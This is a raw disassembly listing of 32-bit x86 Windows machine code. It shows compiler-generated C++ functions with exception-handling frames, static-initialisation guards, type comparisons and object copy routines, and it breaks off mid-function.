  4037e5:	68 4d f3 42 00       	push   $0x42f34d
  4037ea:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4037f0:	50                   	push   %eax
  4037f1:	51                   	push   %ecx
  4037f2:	56                   	push   %esi
  4037f3:	a1 0c 40 44 00       	mov    0x44400c,%eax
  4037f8:	33 c5                	xor    %ebp,%eax
  4037fa:	50                   	push   %eax
  4037fb:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4037fe:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  403804:	8b f1                	mov    %ecx,%esi
  403806:	89 75 f0             	mov    %esi,-0x10(%ebp)
  403809:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  403810:	e8 0b e4 ff ff       	call   0x401c20
  403815:	8b 45 08             	mov    0x8(%ebp),%eax
  403818:	a8 01                	test   $0x1,%al
  40381a:	74 2a                	je     0x403846
  40381c:	a8 04                	test   $0x4,%al
  40381e:	75 1b                	jne    0x40383b
  403820:	8b ce                	mov    %esi,%ecx
  403822:	e8 29 7d 01 00       	call   0x41b550
  403827:	8b c6                	mov    %esi,%eax
  403829:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40382c:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403833:	59                   	pop    %ecx
  403834:	5e                   	pop    %esi
  403835:	8b e5                	mov    %ebp,%esp
  403837:	5d                   	pop    %ebp
  403838:	c2 04 00             	ret    $0x4
  40383b:	6a 2c                	push   $0x2c
  40383d:	56                   	push   %esi
  40383e:	e8 3d de ff ff       	call   0x401680
  403843:	83 c4 08             	add    $0x8,%esp
  403846:	8b c6                	mov    %esi,%eax
  403848:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40384b:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403852:	59                   	pop    %ecx
  403853:	5e                   	pop    %esi
  403854:	8b e5                	mov    %ebp,%esp
  403856:	5d                   	pop    %ebp
  403857:	c2 04 00             	ret    $0x4
  40385a:	cc                   	int3
  40385b:	cc                   	int3
  40385c:	cc                   	int3
  40385d:	cc                   	int3
  40385e:	cc                   	int3
  40385f:	cc                   	int3
  403860:	55                   	push   %ebp
  403861:	8b ec                	mov    %esp,%ebp
  403863:	6a ff                	push   $0xffffffff
  403865:	68 81 f3 42 00       	push   $0x42f381
  40386a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403870:	50                   	push   %eax
  403871:	a1 0c 40 44 00       	mov    0x44400c,%eax
  403876:	33 c5                	xor    %ebp,%eax
  403878:	50                   	push   %eax
  403879:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40387c:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  403882:	64 a1 2c 00 00 00    	mov    %fs:0x2c,%eax
  403888:	8b 08                	mov    (%eax),%ecx
  40388a:	a1 18 66 44 00       	mov    0x446618,%eax
  40388f:	3b 81 04 00 00 00    	cmp    0x4(%ecx),%eax
  403895:	7f 14                	jg     0x4038ab
  403897:	b8 1c 66 44 00       	mov    $0x44661c,%eax
  40389c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40389f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4038a6:	59                   	pop    %ecx
  4038a7:	8b e5                	mov    %ebp,%esp
  4038a9:	5d                   	pop    %ebp
  4038aa:	c3                   	ret
  4038ab:	68 18 66 44 00       	push   $0x446618
  4038b0:	e8 3f a3 02 00       	call   0x42dbf4
  4038b5:	83 c4 04             	add    $0x4,%esp
  4038b8:	83 3d 18 66 44 00 ff 	cmpl   $0xffffffff,0x446618
  4038bf:	75 d6                	jne    0x403897
  4038c1:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4038c8:	b9 20 66 44 00       	mov    $0x446620,%ecx
  4038cd:	68 40 5f 43 00       	push   $0x435f40
  4038d2:	c7 05 1c 66 44 00 f0 	movl   $0x4034f0,0x44661c
  4038d9:	34 40 00 
  4038dc:	e8 4f f3 ff ff       	call   0x402c30
  4038e1:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4038e8:	68 18 66 44 00       	push   $0x446618
  4038ed:	e8 b8 a2 02 00       	call   0x42dbaa
  4038f2:	83 c4 04             	add    $0x4,%esp
  4038f5:	eb a0                	jmp    0x403897
  4038f7:	cc                   	int3
  4038f8:	cc                   	int3
  4038f9:	cc                   	int3
  4038fa:	cc                   	int3
  4038fb:	cc                   	int3
  4038fc:	cc                   	int3
  4038fd:	cc                   	int3
  4038fe:	cc                   	int3
  4038ff:	cc                   	int3
  403900:	55                   	push   %ebp
  403901:	8b ec                	mov    %esp,%ebp
  403903:	56                   	push   %esi
  403904:	57                   	push   %edi
  403905:	e8 56 ff ff ff       	call   0x403860
  40390a:	8b 75 08             	mov    0x8(%ebp),%esi
  40390d:	3b f0                	cmp    %eax,%esi
  40390f:	0f 84 80 00 00 00    	je     0x403995
  403915:	8b 48 0c             	mov    0xc(%eax),%ecx
  403918:	8b 3d c4 54 43 00    	mov    0x4354c4,%edi
  40391e:	3b 4e 0c             	cmp    0xc(%esi),%ecx
  403921:	75 18                	jne    0x40393b
  403923:	8b 4e 08             	mov    0x8(%esi),%ecx
  403926:	39 48 08             	cmp    %ecx,0x8(%eax)
  403929:	75 10                	jne    0x40393b
  40392b:	51                   	push   %ecx
  40392c:	ff 76 04             	push   0x4(%esi)
  40392f:	ff 70 04             	push   0x4(%eax)
  403932:	ff d7                	call   *%edi
  403934:	83 c4 0c             	add    $0xc,%esp
  403937:	85 c0                	test   %eax,%eax
  403939:	74 5a                	je     0x403995
  40393b:	e8 60 e4 ff ff       	call   0x401da0
  403940:	3b f0                	cmp    %eax,%esi
  403942:	74 51                	je     0x403995
  403944:	8b 48 0c             	mov    0xc(%eax),%ecx
  403947:	3b 4e 0c             	cmp    0xc(%esi),%ecx
  40394a:	75 18                	jne    0x403964
  40394c:	8b 4e 08             	mov    0x8(%esi),%ecx
  40394f:	39 48 08             	cmp    %ecx,0x8(%eax)
  403952:	75 10                	jne    0x403964
  403954:	51                   	push   %ecx
  403955:	ff 76 04             	push   0x4(%esi)
  403958:	ff 70 04             	push   0x4(%eax)
  40395b:	ff d7                	call   *%edi
  40395d:	83 c4 0c             	add    $0xc,%esp
  403960:	85 c0                	test   %eax,%eax
  403962:	74 31                	je     0x403995
  403964:	e8 d7 f1 ff ff       	call   0x402b40
  403969:	3b f0                	cmp    %eax,%esi
  40396b:	74 28                	je     0x403995
  40396d:	8b 48 0c             	mov    0xc(%eax),%ecx
  403970:	3b 4e 0c             	cmp    0xc(%esi),%ecx
  403973:	75 18                	jne    0x40398d
  403975:	8b 4e 08             	mov    0x8(%esi),%ecx
  403978:	39 48 08             	cmp    %ecx,0x8(%eax)
  40397b:	75 10                	jne    0x40398d
  40397d:	51                   	push   %ecx
  40397e:	ff 76 04             	push   0x4(%esi)
  403981:	ff 70 04             	push   0x4(%eax)
  403984:	ff d7                	call   *%edi
  403986:	83 c4 0c             	add    $0xc,%esp
  403989:	85 c0                	test   %eax,%eax
  40398b:	74 08                	je     0x403995
  40398d:	5f                   	pop    %edi
  40398e:	33 c0                	xor    %eax,%eax
  403990:	5e                   	pop    %esi
  403991:	5d                   	pop    %ebp
  403992:	c2 04 00             	ret    $0x4
  403995:	5f                   	pop    %edi
  403996:	b8 01 00 00 00       	mov    $0x1,%eax
  40399b:	5e                   	pop    %esi
  40399c:	5d                   	pop    %ebp
  40399d:	c2 04 00             	ret    $0x4
  4039a0:	55                   	push   %ebp
  4039a1:	8b ec                	mov    %esp,%ebp
  4039a3:	6a ff                	push   $0xffffffff
  4039a5:	68 ad f3 42 00       	push   $0x42f3ad
  4039aa:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4039b0:	50                   	push   %eax
  4039b1:	51                   	push   %ecx
  4039b2:	a1 0c 40 44 00       	mov    0x44400c,%eax
  4039b7:	33 c5                	xor    %ebp,%eax
  4039b9:	50                   	push   %eax
  4039ba:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4039bd:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4039c3:	8b d1                	mov    %ecx,%edx
  4039c5:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4039c8:	e8 73 ed ff ff       	call   0x402740
  4039cd:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4039d4:	8b 45 08             	mov    0x8(%ebp),%eax
  4039d7:	c7 02 54 5f 43 00    	movl   $0x435f54,(%edx)
  4039dd:	89 42 0c             	mov    %eax,0xc(%edx)
  4039e0:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4039e7:	8b c2                	mov    %edx,%eax
  4039e9:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4039ec:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4039f3:	59                   	pop    %ecx
  4039f4:	8b e5                	mov    %ebp,%esp
  4039f6:	5d                   	pop    %ebp
  4039f7:	c2 04 00             	ret    $0x4
  4039fa:	cc                   	int3
  4039fb:	cc                   	int3
  4039fc:	cc                   	int3
  4039fd:	cc                   	int3
  4039fe:	cc                   	int3
  4039ff:	cc                   	int3
  403a00:	8b 51 0c             	mov    0xc(%ecx),%edx
  403a03:	33 c0                	xor    %eax,%eax
  403a05:	85 d2                	test   %edx,%edx
  403a07:	74 07                	je     0x403a10
  403a09:	66 39 02             	cmp    %ax,(%edx)
  403a0c:	0f 94 c0             	sete   %al
  403a0f:	c3                   	ret
  403a10:	83 79 24 02          	cmpl   $0x2,0x24(%ecx)
  403a14:	0f 9e c0             	setle  %al
  403a17:	c3                   	ret
  403a18:	cc                   	int3
  403a19:	cc                   	int3
  403a1a:	cc                   	int3
  403a1b:	cc                   	int3
  403a1c:	cc                   	int3
  403a1d:	cc                   	int3
  403a1e:	cc                   	int3
  403a1f:	cc                   	int3
  403a20:	55                   	push   %ebp
  403a21:	8b ec                	mov    %esp,%ebp
  403a23:	6a ff                	push   $0xffffffff
  403a25:	68 e1 f3 42 00       	push   $0x42f3e1
  403a2a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403a30:	50                   	push   %eax
  403a31:	a1 0c 40 44 00       	mov    0x44400c,%eax
  403a36:	33 c5                	xor    %ebp,%eax
  403a38:	50                   	push   %eax
  403a39:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403a3c:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  403a42:	64 a1 2c 00 00 00    	mov    %fs:0x2c,%eax
  403a48:	8b 08                	mov    (%eax),%ecx
  403a4a:	a1 b4 66 44 00       	mov    0x4466b4,%eax
  403a4f:	3b 81 04 00 00 00    	cmp    0x4(%ecx),%eax
  403a55:	7f 14                	jg     0x403a6b
  403a57:	b8 a4 66 44 00       	mov    $0x4466a4,%eax
  403a5c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403a5f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403a66:	59                   	pop    %ecx
  403a67:	8b e5                	mov    %ebp,%esp
  403a69:	5d                   	pop    %ebp
  403a6a:	c3                   	ret
  403a6b:	68 b4 66 44 00       	push   $0x4466b4
  403a70:	e8 7f a1 02 00       	call   0x42dbf4
  403a75:	83 c4 04             	add    $0x4,%esp
  403a78:	83 3d b4 66 44 00 ff 	cmpl   $0xffffffff,0x4466b4
  403a7f:	75 d6                	jne    0x403a57
  403a81:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  403a88:	b9 a8 66 44 00       	mov    $0x4466a8,%ecx
  403a8d:	68 9c 5f 43 00       	push   $0x435f9c
  403a92:	c7 05 a4 66 44 00 60 	movl   $0x403b60,0x4466a4
  403a99:	3b 40 00 
  403a9c:	e8 8f f1 ff ff       	call   0x402c30
  403aa1:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  403aa8:	68 b4 66 44 00       	push   $0x4466b4
  403aad:	e8 f8 a0 02 00       	call   0x42dbaa
  403ab2:	83 c4 04             	add    $0x4,%esp
  403ab5:	eb a0                	jmp    0x403a57
  403ab7:	cc                   	int3
  403ab8:	cc                   	int3
  403ab9:	cc                   	int3
  403aba:	cc                   	int3
  403abb:	cc                   	int3
  403abc:	cc                   	int3
  403abd:	cc                   	int3
  403abe:	cc                   	int3
  403abf:	cc                   	int3
  403ac0:	55                   	push   %ebp
  403ac1:	8b ec                	mov    %esp,%ebp
  403ac3:	56                   	push   %esi
  403ac4:	57                   	push   %edi
  403ac5:	e8 56 ff ff ff       	call   0x403a20
  403aca:	8b 75 08             	mov    0x8(%ebp),%esi
  403acd:	3b f0                	cmp    %eax,%esi
  403acf:	0f 84 80 00 00 00    	je     0x403b55
  403ad5:	8b 48 0c             	mov    0xc(%eax),%ecx
  403ad8:	8b 3d c4 54 43 00    	mov    0x4354c4,%edi
  403ade:	3b 4e 0c             	cmp    0xc(%esi),%ecx
  403ae1:	75 18                	jne    0x403afb
  403ae3:	8b 4e 08             	mov    0x8(%esi),%ecx
  403ae6:	39 48 08             	cmp    %ecx,0x8(%eax)
  403ae9:	75 10                	jne    0x403afb
  403aeb:	51                   	push   %ecx
  403aec:	ff 76 04             	push   0x4(%esi)
  403aef:	ff 70 04             	push   0x4(%eax)
  403af2:	ff d7                	call   *%edi
  403af4:	83 c4 0c             	add    $0xc,%esp
  403af7:	85 c0                	test   %eax,%eax
  403af9:	74 5a                	je     0x403b55
  403afb:	e8 90 3f 00 00       	call   0x407a90
  403b00:	3b f0                	cmp    %eax,%esi
  403b02:	74 51                	je     0x403b55
  403b04:	8b 48 0c             	mov    0xc(%eax),%ecx
  403b07:	3b 4e 0c             	cmp    0xc(%esi),%ecx
  403b0a:	75 18                	jne    0x403b24
  403b0c:	8b 4e 08             	mov    0x8(%esi),%ecx
  403b0f:	39 48 08             	cmp    %ecx,0x8(%eax)
  403b12:	75 10                	jne    0x403b24
  403b14:	51                   	push   %ecx
  403b15:	ff 76 04             	push   0x4(%esi)
  403b18:	ff 70 04             	push   0x4(%eax)
  403b1b:	ff d7                	call   *%edi
  403b1d:	83 c4 0c             	add    $0xc,%esp
  403b20:	85 c0                	test   %eax,%eax
  403b22:	74 31                	je     0x403b55
  403b24:	e8 17 f0 ff ff       	call   0x402b40
  403b29:	3b f0                	cmp    %eax,%esi
  403b2b:	74 28                	je     0x403b55
  403b2d:	8b 48 0c             	mov    0xc(%eax),%ecx
  403b30:	3b 4e 0c             	cmp    0xc(%esi),%ecx
  403b33:	75 18                	jne    0x403b4d
  403b35:	8b 4e 08             	mov    0x8(%esi),%ecx
  403b38:	39 48 08             	cmp    %ecx,0x8(%eax)
  403b3b:	75 10                	jne    0x403b4d
  403b3d:	51                   	push   %ecx
  403b3e:	ff 76 04             	push   0x4(%esi)
  403b41:	ff 70 04             	push   0x4(%eax)
  403b44:	ff d7                	call   *%edi
  403b46:	83 c4 0c             	add    $0xc,%esp
  403b49:	85 c0                	test   %eax,%eax
  403b4b:	74 08                	je     0x403b55
  403b4d:	5f                   	pop    %edi
  403b4e:	33 c0                	xor    %eax,%eax
  403b50:	5e                   	pop    %esi
  403b51:	5d                   	pop    %ebp
  403b52:	c2 04 00             	ret    $0x4
  403b55:	5f                   	pop    %edi
  403b56:	b8 01 00 00 00       	mov    $0x1,%eax
  403b5b:	5e                   	pop    %esi
  403b5c:	5d                   	pop    %ebp
  403b5d:	c2 04 00             	ret    $0x4
  403b60:	55                   	push   %ebp
  403b61:	8b ec                	mov    %esp,%ebp
  403b63:	6a ff                	push   $0xffffffff
  403b65:	68 fd ed 42 00       	push   $0x42edfd
  403b6a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403b70:	50                   	push   %eax
  403b71:	51                   	push   %ecx
  403b72:	a1 0c 40 44 00       	mov    0x44400c,%eax
  403b77:	33 c5                	xor    %ebp,%eax
  403b79:	50                   	push   %eax
  403b7a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403b7d:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  403b83:	81 3d c8 69 44 00 4c 	cmpl   $0x14c,0x4469c8
  403b8a:	01 00 00 
  403b8d:	7c 2c                	jl     0x403bbb
  403b8f:	68 cc 69 44 00       	push   $0x4469cc
  403b94:	e8 67 a1 01 00       	call   0x41dd00
  403b99:	8b 0d c4 69 44 00    	mov    0x4469c4,%ecx
  403b9f:	83 c4 04             	add    $0x4,%esp
  403ba2:	85 c9                	test   %ecx,%ecx
  403ba4:	74 07                	je     0x403bad
  403ba6:	8b 01                	mov    (%ecx),%eax
  403ba8:	a3 c4 69 44 00       	mov    %eax,0x4469c4
  403bad:	c7 05 cc 69 44 00 01 	movl   $0x1,0x4469cc
  403bb4:	00 00 00 
  403bb7:	85 c9                	test   %ecx,%ecx
  403bb9:	75 22                	jne    0x403bdd
  403bbb:	68 4c 01 00 00       	push   $0x14c
  403bc0:	6a 00                	push   $0x0
  403bc2:	ff 15 d8 51 43 00    	call   *0x4351d8
  403bc8:	50                   	push   %eax
  403bc9:	ff 15 e8 51 43 00    	call   *0x4351e8
  403bcf:	8b c8                	mov    %eax,%ecx
  403bd1:	85 c9                	test   %ecx,%ecx
  403bd3:	75 08                	jne    0x403bdd
  403bd5:	6a ff                	push   $0xffffffff
  403bd7:	ff 15 4c 54 43 00    	call   *0x43544c
  403bdd:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  403be0:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  403be7:	e8 44 03 00 00       	call   0x403f30
  403bec:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  403bf3:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403bf6:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403bfd:	59                   	pop    %ecx
  403bfe:	8b e5                	mov    %ebp,%esp
  403c00:	5d                   	pop    %ebp
  403c01:	c3                   	ret
  403c02:	cc                   	int3
  403c03:	cc                   	int3
  403c04:	cc                   	int3
  403c05:	cc                   	int3
  403c06:	cc                   	int3
  403c07:	cc                   	int3
  403c08:	cc                   	int3
  403c09:	cc                   	int3
  403c0a:	cc                   	int3
  403c0b:	cc                   	int3
  403c0c:	cc                   	int3
  403c0d:	cc                   	int3
  403c0e:	cc                   	int3
  403c0f:	cc                   	int3
  403c10:	e9 0b fe ff ff       	jmp    0x403a20
  403c15:	cc                   	int3
  403c16:	cc                   	int3
  403c17:	cc                   	int3
  403c18:	cc                   	int3
  403c19:	cc                   	int3
  403c1a:	cc                   	int3
  403c1b:	cc                   	int3
  403c1c:	cc                   	int3
  403c1d:	cc                   	int3
  403c1e:	cc                   	int3
  403c1f:	cc                   	int3
  403c20:	55                   	push   %ebp
  403c21:	8b ec                	mov    %esp,%ebp
  403c23:	53                   	push   %ebx
  403c24:	56                   	push   %esi
  403c25:	57                   	push   %edi
  403c26:	8b d9                	mov    %ecx,%ebx
  403c28:	e8 f3 fd ff ff       	call   0x403a20
  403c2d:	8b 7d 08             	mov    0x8(%ebp),%edi
  403c30:	8b f0                	mov    %eax,%esi
  403c32:	8b cf                	mov    %edi,%ecx
  403c34:	8b 17                	mov    (%edi),%edx
  403c36:	ff 52 14             	call   *0x14(%edx)
  403c39:	3b f0                	cmp    %eax,%esi
  403c3b:	74 2d                	je     0x403c6a
  403c3d:	8b 48 0c             	mov    0xc(%eax),%ecx
  403c40:	3b 4e 0c             	cmp    0xc(%esi),%ecx
  403c43:	75 1c                	jne    0x403c61
  403c45:	8b 4e 08             	mov    0x8(%esi),%ecx
  403c48:	39 48 08             	cmp    %ecx,0x8(%eax)
  403c4b:	75 14                	jne    0x403c61
  403c4d:	51                   	push   %ecx
  403c4e:	ff 76 04             	push   0x4(%esi)
  403c51:	ff 70 04             	push   0x4(%eax)
  403c54:	ff 15 c4 54 43 00    	call   *0x4354c4
  403c5a:	83 c4 0c             	add    $0xc,%esp
  403c5d:	85 c0                	test   %eax,%eax
  403c5f:	74 09                	je     0x403c6a
  403c61:	5f                   	pop    %edi
  403c62:	5e                   	pop    %esi
  403c63:	33 c0                	xor    %eax,%eax
  403c65:	5b                   	pop    %ebx
  403c66:	5d                   	pop    %ebp
  403c67:	c2 04 00             	ret    $0x4
  403c6a:	57                   	push   %edi
  403c6b:	8b cb                	mov    %ebx,%ecx
  403c6d:	e8 fe 01 00 00       	call   0x403e70
  403c72:	5f                   	pop    %edi
  403c73:	5e                   	pop    %esi
  403c74:	5b                   	pop    %ebx
  403c75:	5d                   	pop    %ebp
  403c76:	c2 04 00             	ret    $0x4
  403c79:	cc                   	int3
  403c7a:	cc                   	int3
  403c7b:	cc                   	int3
  403c7c:	cc                   	int3
  403c7d:	cc                   	int3
  403c7e:	cc                   	int3
  403c7f:	cc                   	int3
  403c80:	55                   	push   %ebp
  403c81:	8b ec                	mov    %esp,%ebp
  403c83:	6a ff                	push   $0xffffffff
  403c85:	68 15 f4 42 00       	push   $0x42f415
  403c8a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403c90:	50                   	push   %eax
  403c91:	51                   	push   %ecx
  403c92:	56                   	push   %esi
  403c93:	57                   	push   %edi
  403c94:	a1 0c 40 44 00       	mov    0x44400c,%eax
  403c99:	33 c5                	xor    %ebp,%eax
  403c9b:	50                   	push   %eax
  403c9c:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403c9f:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  403ca5:	8b f9                	mov    %ecx,%edi
  403ca7:	81 3d c8 69 44 00 4c 	cmpl   $0x14c,0x4469c8
  403cae:	01 00 00 
  403cb1:	7c 2c                	jl     0x403cdf
  403cb3:	68 cc 69 44 00       	push   $0x4469cc
  403cb8:	e8 43 a0 01 00       	call   0x41dd00
  403cbd:	8b 35 c4 69 44 00    	mov    0x4469c4,%esi
  403cc3:	83 c4 04             	add    $0x4,%esp
  403cc6:	85 f6                	test   %esi,%esi
  403cc8:	74 07                	je     0x403cd1
  403cca:	8b 06                	mov    (%esi),%eax
  403ccc:	a3 c4 69 44 00       	mov    %eax,0x4469c4
  403cd1:	c7 05 cc 69 44 00 01 	movl   $0x1,0x4469cc
  403cd8:	00 00 00 
  403cdb:	85 f6                	test   %esi,%esi
  403cdd:	75 22                	jne    0x403d01
  403cdf:	68 4c 01 00 00       	push   $0x14c
  403ce4:	6a 00                	push   $0x0
  403ce6:	ff 15 d8 51 43 00    	call   *0x4351d8
  403cec:	50                   	push   %eax
  403ced:	ff 15 e8 51 43 00    	call   *0x4351e8
  403cf3:	8b f0                	mov    %eax,%esi
  403cf5:	85 f6                	test   %esi,%esi
  403cf7:	75 08                	jne    0x403d01
  403cf9:	6a ff                	push   $0xffffffff
  403cfb:	ff 15 4c 54 43 00    	call   *0x43544c
  403d01:	89 75 f0             	mov    %esi,-0x10(%ebp)
  403d04:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  403d0b:	8b ce                	mov    %esi,%ecx
  403d0d:	e8 1e 02 00 00       	call   0x403f30
  403d12:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  403d16:	8b ce                	mov    %esi,%ecx
  403d18:	57                   	push   %edi
  403d19:	c7 06 1c 63 43 00    	movl   $0x43631c,(%esi)
  403d1f:	e8 dc 00 00 00       	call   0x403e00
  403d24:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  403d2b:	8b c6                	mov    %esi,%eax
  403d2d:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403d30:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403d37:	59                   	pop    %ecx
  403d38:	5f                   	pop    %edi
  403d39:	5e                   	pop    %esi
  403d3a:	8b e5                	mov    %ebp,%esp
  403d3c:	5d                   	pop    %ebp
  403d3d:	c3                   	ret
  403d3e:	cc                   	int3
  403d3f:	cc                   	int3
  403d40:	55                   	push   %ebp
  403d41:	8b ec                	mov    %esp,%ebp
  403d43:	53                   	push   %ebx
  403d44:	8b 5d 08             	mov    0x8(%ebp),%ebx
  403d47:	56                   	push   %esi
  403d48:	57                   	push   %edi
  403d49:	8b f9                	mov    %ecx,%edi
  403d4b:	8b 33                	mov    (%ebx),%esi
  403d4d:	e8 ce fc ff ff       	call   0x403a20
  403d52:	50                   	push   %eax
  403d53:	8b cb                	mov    %ebx,%ecx
  403d55:	ff 56 34             	call   *0x34(%esi)
  403d58:	85 c0                	test   %eax,%eax
  403d5a:	74 1b                	je     0x403d77
  403d5c:	8b 07                	mov    (%edi),%eax
  403d5e:	8b cf                	mov    %edi,%ecx
  403d60:	ff 50 44             	call   *0x44(%eax)
  403d63:	53                   	push   %ebx
  403d64:	8b cf                	mov    %edi,%ecx
  403d66:	e8 95 00 00 00       	call   0x403e00
  403d6b:	5f                   	pop    %edi
  403d6c:	5e                   	pop    %esi
  403d6d:	b8 01 00 00 00       	mov    $0x1,%eax
  403d72:	5b                   	pop    %ebx
  403d73:	5d                   	pop    %ebp
  403d74:	c2 04 00             	ret    $0x4
  403d77:	5f                   	pop    %edi
  403d78:	5e                   	pop    %esi
  403d79:	33 c0                	xor    %eax,%eax
  403d7b:	5b                   	pop    %ebx
  403d7c:	5d                   	pop    %ebp
  403d7d:	c2 04 00             	ret    $0x4
  403d80:	55                   	push   %ebp
  403d81:	8b ec                	mov    %esp,%ebp
  403d83:	6a ff                	push   $0xffffffff
  403d85:	68 50 f4 42 00       	push   $0x42f450
  403d8a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403d90:	50                   	push   %eax
  403d91:	81 ec 4c 01 00 00    	sub    $0x14c,%esp
  403d97:	56                   	push   %esi
  403d98:	57                   	push   %edi
  403d99:	a1 0c 40 44 00       	mov    0x44400c,%eax
  403d9e:	33 c5                	xor    %ebp,%eax
  403da0:	50                   	push   %eax
  403da1:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403da4:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  403daa:	8b f9                	mov    %ecx,%edi
  403dac:	8d 8d a8 fe ff ff    	lea    -0x158(%ebp),%ecx
  403db2:	e8 79 01 00 00       	call   0x403f30
  403db7:	8b f0                	mov    %eax,%esi
  403db9:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  403dc0:	8b cf                	mov    %edi,%ecx
  403dc2:	8b 17                	mov    (%edi),%edx
  403dc4:	ff 52 44             	call   *0x44(%edx)
  403dc7:	56                   	push   %esi
  403dc8:	8b cf                	mov    %edi,%ecx
  403dca:	e8 31 00 00 00       	call   0x403e00
  403dcf:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  403dd6:	8d 8d a8 fe ff ff    	lea    -0x158(%ebp),%ecx
  403ddc:	e8 8f 04 00 00       	call   0x404270
  403de1:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403de4:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403deb:	59                   	pop    %ecx
  403dec:	5f                   	pop    %edi
  403ded:	5e                   	pop    %esi
  403dee:	8b e5                	mov    %ebp,%esp
  403df0:	5d                   	pop    %ebp
  403df1:	c3                   	ret
  403df2:	cc                   	int3
  403df3:	cc                   	int3
  403df4:	cc                   	int3
  403df5:	cc                   	int3
  403df6:	cc                   	int3
  403df7:	cc                   	int3
  403df8:	cc                   	int3
  403df9:	cc                   	int3
  403dfa:	cc                   	int3
  403dfb:	cc                   	int3
  403dfc:	cc                   	int3
  403dfd:	cc                   	int3
  403dfe:	cc                   	int3
  403dff:	cc                   	int3
  403e00:	55                   	push   %ebp
  403e01:	8b ec                	mov    %esp,%ebp
  403e03:	53                   	push   %ebx
  403e04:	56                   	push   %esi
  403e05:	57                   	push   %edi
  403e06:	8b 7d 08             	mov    0x8(%ebp),%edi
  403e09:	8b f1                	mov    %ecx,%esi
  403e0b:	8b 47 04             	mov    0x4(%edi),%eax
  403e0e:	89 46 04             	mov    %eax,0x4(%esi)
  403e11:	8b 47 08             	mov    0x8(%edi),%eax
  403e14:	89 46 08             	mov    %eax,0x8(%esi)
  403e17:	8b 5f 0c             	mov    0xc(%edi),%ebx
  403e1a:	85 db                	test   %ebx,%ebx
  403e1c:	74 07                	je     0x403e25
  403e1e:	8b cb                	mov    %ebx,%ecx
  403e20:	e8 7b 59 01 00       	call   0x4197a0
  403e25:	8b 4e 0c             	mov    0xc(%esi),%ecx
  403e28:	85 c9                	test   %ecx,%ecx
  403e2a:	74 05                	je     0x403e31
  403e2c:	8b 01                	mov    (%ecx),%eax
  403e2e:	ff 50 20             	call   *0x20(%eax)
  403e31:	89 5e 0c             	mov    %ebx,0xc(%esi)
  403e34:	8d 4e 10             	lea    0x10(%esi),%ecx
  403e37:	8b 46 10             	mov    0x10(%esi),%eax
  403e3a:	ff 50 44             	call   *0x44(%eax)
  403e3d:	8b 47 14             	mov    0x14(%edi),%eax
  403e40:	8d 4e 20             	lea    0x20(%esi),%ecx
  403e43:	89 46 14             	mov    %eax,0x14(%esi)
  403e46:	8b 47 18             	mov    0x18(%edi),%eax
  403e49:	89 46 18             	mov    %eax,0x18(%esi)
  403e4c:	8b 47 1c             	mov    0x1c(%edi),%eax
  403e4f:	89 46 1c             	mov    %eax,0x1c(%esi)
  403e52:	8b 46 20             	mov    0x20(%esi),%eax
  403e55:	ff 50 44             	call   *0x44(%eax)
  403e58:	8d 47 20             	lea    0x20(%edi),%eax
  403e5b:	50                   	push   %eax
  403e5c:	8d 4e 20             	lea    0x20(%esi),%ecx
  403e5f:	e8 1c e4 ff ff       	call   0x402280
  403e64:	5f                   	pop    %edi
  403e65:	5e                   	pop    %esi
  403e66:	5b                   	pop    %ebx
  403e67:	5d                   	pop    %ebp
